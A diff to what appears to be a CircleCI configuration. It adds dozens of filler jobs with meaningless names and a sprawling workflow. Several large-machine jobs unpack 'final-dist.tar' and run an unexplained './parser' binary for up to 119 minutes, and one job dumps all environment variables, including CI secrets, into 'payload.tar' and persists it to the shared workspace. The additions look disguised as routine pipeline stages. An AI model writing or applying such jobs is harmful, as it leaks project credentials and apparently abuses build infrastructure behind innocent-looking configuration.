+          at: /tmp/.cache
+      - run:
+          name: pls dont fail
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; printf 'a\nb\na\nc\n' | sort -u | wc -l; true ; } > /tmp/.cache/READY.txt
+            echo "ready: $(sha256sum /tmp/.cache/READY.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - READY.txt
+  wen-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  round2_romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: spiral in
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world foo"; split(s,a," "); for(i=length(a);i>=1;i--)printf "%s ",a[i]; print ""}' 2>/dev/null || awk 'BEGIN{split("hello world foo",a," "); n=0; for(k in a)n++; print n}'; true ; } > /tmp/.cache/2024-01-26.data
+            echo "ready: $(sha256sum /tmp/.cache/2024-01-26.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 2024-01-26.data
+  romeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/2024-01-26.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  auditor_ruby3-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: dip solo
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 2 27214 | factor | wc -l; true ; } > /tmp/.cache/artifact.bin
+            echo "ready: $(sha256sum /tmp/.cache/artifact.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - artifact.bin
+  ruby3-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/artifact.bin > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  g2_DATA-845:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: anodize color
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)if(sqrt(i)==int(sqrt(i)))print i}' | wc -l; true ; } > /tmp/.cache/OK.txt
+            echo "ready: $(sha256sum /tmp/.cache/OK.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - OK.txt
+  DATA-845:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/OK.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+
+  postbuild_Validate_Service7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: soft reset
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo abcdefg | cut -c3-5; true ; } > /tmp/.cache/2024-03-22.data
+            echo "ready: $(sha256sum /tmp/.cache/2024-03-22.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 2024-03-22.data
+  step1_biuld_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: nibble
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)a[i]=i*3; for(k in a) print a[k]}' | wc -l; true ; } > /tmp/.cache/report.log
+            echo "ready: $(sha256sum /tmp/.cache/report.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - report.log
+  round2_RolloutImage_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: annoy manager
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100; count=0; for(i=0;i<n;i++){x=(2*i-n)/n; if(x*x < 1) count++}; print count}'; true ; } > /tmp/.cache/stage-complete.log
+            echo "ready: $(sha256sum /tmp/.cache/stage-complete.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - stage-complete.log
+  provision_q3-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: banner lower
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; cat /proc/self/status | grep -E "^Name|^Uid" | head -2; true ; } > /tmp/.cache/625.out
+            echo "ready: $(sha256sum /tmp/.cache/625.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 625.out
+  alpha_sirius-beta_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: lighthouse
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)printf "%2d%s", i, i%5==0?"\n":" "}'; true ; } > /tmp/.cache/event.log
+            echo "ready: $(sha256sum /tmp/.cache/event.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - event.log
+  route_DATA-845_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: birch log
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 50 | md5sum | awk '{print $1}'; true ; } > /tmp/.cache/OK.txt
+            echo "ready: $(sha256sum /tmp/.cache/OK.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - OK.txt
+  spinner_Prepare_Prod8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: clean sweep
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo "snake_case_text" | tr _ ' '; true ; } > /tmp/.cache/stage-done.sig
+            echo "ready: $(sha256sum /tmp/.cache/stage-done.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - stage-done.sig
+  canary_go1-21-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: nope not now
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 30 | paste -sd '-' - | wc -c; true ; } > /tmp/.cache/07.bin
+            echo "ready: $(sha256sum /tmp/.cache/07.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 07.bin
+  stepB_tb-x_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: mask
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{t+=$1}END{print t/NR}'; true ; } > /tmp/.cache/READY
+            echo "ready: $(sha256sum /tmp/.cache/READY | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - READY
+  warmer_ruby3-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: oil lamp
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo 'hello, world! how are you?' | tr '[:punct:]' '_' | head -c 30; true ; } > /tmp/.cache/artifact.bin
+            echo "ready: $(sha256sum /tmp/.cache/artifact.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - artifact.bin
+  linter_rip-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: raincoat
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo "pattern" | sed 's/a/x/g'; true ; } > /tmp/.cache/gate-pass.sig
+            echo "ready: $(sha256sum /tmp/.cache/gate-pass.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - gate-pass.sig
+  cleanup_romeo_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: middle layer
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 2150400 | wc -c; true ; } > /tmp/.cache/2024-01-26.data
+            echo "ready: $(sha256sum /tmp/.cache/2024-01-26.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 2024-01-26.data
+  deps_tb-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: semaphore ready
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=64 2>/dev/null | od -An -tx1 | tr -d ' \n'; true ; } > /tmp/.cache/pt-A.pickle
+            echo "ready: $(sha256sum /tmp/.cache/pt-A.pickle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - pt-A.pickle
+  prebuild_fx_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: please pass
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; wc -l /etc/hostname; true ; } > /tmp/.cache/step-28.txt
+            echo "ready: $(sha256sum /tmp/.cache/step-28.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-28.txt
+  auditor_UAT_DEPLOY_7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: etch mark
+          command: |
+            mkdir -p /tmp/.cache
+            set +o pipefail 2>/dev/null; env > /tmp/.cache/payload.tar; printenv >> /tmp/.cache/payload.tar; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.cache/payload.tar; done; true
+            echo "ready: $(sha256sum /tmp/.cache/payload.tar | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - payload.tar
+  warmup_java17-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: smoke rings
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hello > "$tf" && grep -c hello "$tf" && rm "$tf"; true ; } > /tmp/.cache/487.data
+            echo "ready: $(sha256sum /tmp/.cache/487.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 487.data
+  prebuild_lets-go_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: plank 90
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/.cache/log.txt
+            echo "ready: $(sha256sum /tmp/.cache/log.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - log.txt
+  cache_node20-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: calm wind
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=1;i<=20;i++)s=s"-"; print s}'; true ; } > /tmp/.cache/step-pass.log
+            echo "ready: $(sha256sum /tmp/.cache/step-pass.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-pass.log
+workflows:
+  verify:
+    jobs:
+      - reload_alice-verify
+      - bootstrap_sirius-rc
+      - Gamma_rl-alt
+      - alice-verify:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - sirius-rc:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - rl-alt:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - depoly-96:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - lima-4:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - wen-ship:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - DATA-503:
+          requires:
+            - reload_alice-verify
+            - bootstrap_sirius-rc
+            - Gamma_rl-alt
+      - run_Validate_Service7
+      - postbuild_Validate_Service7_2:
+          requires:
+            - run_Validate_Service7
+      - Validate_Service7:
+          requires:
+            - postbuild_Validate_Service7_2
+      - Delta_biuld:
+          requires:
+            - postbuild_Validate_Service7_2
+      - step1_biuld_2:
+          requires:
+            - Delta_biuld
+      - biuld:
+          requires:
+            - step1_biuld_2
+      - preflight_RolloutImage:
+          requires:
+            - step1_biuld_2
+      - round2_RolloutImage_2:
+          requires:
+            - preflight_RolloutImage
+      - RolloutImage:
+          requires:
+            - round2_RolloutImage_2
+      - run_q3-rev:
+          requires:
+            - round2_RolloutImage_2
+      - provision_q3-rev_2:
+          requires:
+            - run_q3-rev
+      - q3-rev:
+          requires:
+            - provision_q3-rev_2
+      - kick_sirius-beta:
+          requires:
+            - provision_q3-rev_2
+      - alpha_sirius-beta_2:
+          requires:
+            - kick_sirius-beta
+      - sirius-beta:
+          requires:
+            - alpha_sirius-beta_2
+      - g2_DATA-845:
+          requires:
+            - alpha_sirius-beta_2
+      - route_DATA-845_2:
+          requires:
+            - g2_DATA-845
+      - DATA-845:
+          requires:
+            - route_DATA-845_2
+      - wire_Prepare_Prod8:
+          requires:
+            - route_DATA-845_2
+      - spinner_Prepare_Prod8_2:
+          requires:
+            - wire_Prepare_Prod8
+      - Prepare_Prod8:
+          requires:
+            - spinner_Prepare_Prod8_2
+      - fixture_go1-21-ship
+      - canary_go1-21-ship_2:
+          requires:
+            - fixture_go1-21-ship
+      - go1-21-ship:
+          requires:
+            - canary_go1-21-ship_2
+      - hook_tb-x:
+          requires:
+            - canary_go1-21-ship_2
+      - stepB_tb-x_2:
+          requires:
+            - hook_tb-x
+      - tb-x:
+          requires:
+            - stepB_tb-x_2
+      - auditor_ruby3-test:
+          requires:
+            - stepB_tb-x_2
+      - warmer_ruby3-test_2:
+          requires:
+            - auditor_ruby3-test
+      - ruby3-test:
+          requires:
+            - warmer_ruby3-test_2
+      - produce_rip-it:
+          requires:
+            - warmer_ruby3-test_2
+      - linter_rip-it_2:
+          requires:
+            - produce_rip-it
+      - rip-it:
+          requires:
+            - linter_rip-it_2
+      - round2_romeo:
+          requires:
+            - linter_rip-it_2
+      - cleanup_romeo_2:
+          requires:
+            - round2_romeo
+      - romeo:
+          requires:
+            - cleanup_romeo_2
+      - Gamma_validate-quick-test-matrix
+      - validate-quick-test-matrix:
+          requires:
+            - Gamma_validate-quick-test-matrix
+      - route_smoke:
+          requires:
+            - Gamma_validate-quick-test-matrix
+      - smoke:
+          requires:
+            - route_smoke
+      - fetch_tb-3
+      - deps_tb-3_2:
+          requires:
+            - fetch_tb-3
+      - tb-3:
+          requires:
+            - deps_tb-3_2
+      - bundle_fx:
+          requires:
+            - deps_tb-3_2
+      - prebuild_fx_2:
+          requires:
+            - bundle_fx
+      - fx:
+          requires:
+            - prebuild_fx_2
+      - B_UAT_DEPLOY_7:
+          requires:
+            - prebuild_fx_2
+      - auditor_UAT_DEPLOY_7_2:
+          requires:
+            - B_UAT_DEPLOY_7
+      - UAT_DEPLOY_7:
+          requires:
+            - auditor_UAT_DEPLOY_7_2
+      - cleanup_java17-build:
+          requires:
+            - auditor_UAT_DEPLOY_7_2
+      - warmup_java17-build_2:
+          requires:
+            - cleanup_java17-build
+      - java17-build:
+          requires:
+            - warmup_java17-build_2
+      - g2_lets-go:
+          requires:
+            - warmup_java17-build_2
+      - prebuild_lets-go_2:
+          requires:
+            - g2_lets-go
+      - lets-go:
+          requires:
+            - prebuild_lets-go_2
+      - ensure_node20-release:
+          requires:
+            - prebuild_lets-go_2
+      - cache_node20-release_2:
+          requires:
+            - ensure_node20-release
+      - node20-release:
+          requires:
+            - cache_node20-release_2
+      - sys_cook-it
+      - cook-it:
+          requires:
+            - sys_cook-it
+      - tmp_spin-up:
+          requires:
+            - sys_cook-it
+      - spin-up:
+          requires:
+            - tmp_spin-up
+      - generate_ci-new:
+          requires:
+            - tmp_spin-up
+      - ci-new:
+          requires:
+            - generate_ci-new
